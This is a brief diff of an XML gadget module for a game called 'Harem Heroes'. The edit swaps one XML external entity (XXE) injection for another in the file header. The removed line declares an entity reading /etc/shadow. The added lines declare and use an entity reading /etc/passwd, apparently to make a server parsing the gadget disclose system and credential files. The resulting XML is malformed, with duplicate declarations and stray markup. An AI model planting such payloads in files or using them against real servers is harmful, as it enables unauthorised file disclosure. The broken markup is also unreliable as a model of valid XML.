@@ -1,6 +1,9 @@
 <?xml version="1.0" encoding="UTF-8" ?> 
-<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
-<Module>
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+]><Module>
 	<ModulePrefs title="Harem Heroes">
 		<Require feature="nutaku" />
 		<Require feature="dynamic-height" />
